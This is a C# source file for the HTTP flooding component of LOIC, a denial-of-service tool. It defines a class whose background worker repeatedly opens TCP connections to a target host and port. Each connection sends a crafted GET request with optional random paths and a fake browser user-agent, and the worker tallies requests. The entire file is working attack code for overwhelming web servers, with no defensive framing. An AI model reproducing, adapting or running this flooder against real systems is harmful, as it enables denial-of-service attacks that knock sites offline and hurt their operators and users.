using System;
using System.ComponentModel;
using System.Net.Sockets;

namespace LOIC
{   
	public class HTTPFlooder : cHLDos
	{
		public string IP { get; set; }
        public string DNS { get; set; }
		public int Port { get; set; }
		public string Subsite { get; set; }
		public bool Resp { get; set; }

        private Random rnd = new Random();
        private bool random;
        private bool usegZip;

        public HTTPFlooder(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip)
		{
            this.IsDelayed = false;
            this.DNS = (dns == "") ? ip : dns;
			this.IP = ip;
			this.Port = port;
			this.Subsite = subSite;
			this.Resp = resp;
			this.Delay = delay;
			this.Timeout = timeout * 1000;
            this.random = random;
            this.usegZip = usegzip;
		}
		public override void start()
		{
            IsDelayed = false;
			IsFlooding = true; 
			var bw = new BackgroundWorker();
			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
			bw.RunWorkerAsync();
		}

		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
                byte[] buf;
                if (random == true)
                {
                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}Host: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}{4}{2}", Subsite, new Functions().RandomString(), Environment.NewLine, DNS, ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine): "")));
                }
                else
                {
                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}Host: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}{3}{1}", Subsite, Environment.NewLine, DNS, ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine): "")));
                }

                byte[] recvBuf = new byte[64];
                while (IsFlooding)
				{
					State = ReqState.Ready; // SET STATE TO READY //
					var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					State = ReqState.Connecting; // SET STATE TO CONNECTING //
					socket.Connect(((IP == "") ? DNS : IP), Port); //(host)
					socket.Blocking = Resp;
					State = ReqState.Requesting; // SET STATE TO REQUESTING //
                    socket.ReceiveTimeout = Timeout;
					socket.Send(buf, SocketFlags.None);
					State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
					if (Resp)
                    {
                        try 
                        { 
                            socket.Receive(recvBuf);
                            Downloaded++;
                        }
                        catch 
                        { 
                            Failed++;
                        }
                    }
					State = ReqState.Completed;  // SET STATE TO COMPLETED // DOWNLOADED++
					if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
				}
			}
			catch { }
			finally { IsFlooding = false; }
		}
	}
}
